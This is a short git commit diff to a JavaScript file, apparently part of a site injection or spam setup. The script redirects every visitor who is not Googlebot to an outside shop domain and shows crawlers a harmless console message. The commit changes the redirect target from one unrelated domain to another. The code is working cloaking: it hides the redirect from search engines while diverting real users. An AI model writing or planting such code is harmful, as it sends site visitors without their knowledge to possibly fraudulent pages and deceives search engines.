876d91d3d6a05670e3b7d8a1b8cd93db7cc934be
sportb133 <sportb133@gmail.com>
2026-09-08 17:12:54 +0600

    Update 2x.js

--- xxx/2x.js
+++ xxx/2x.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://deo.bionetgen.org/?a2z";
+  window.location.href = "https://yourovision.shop/?top1";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
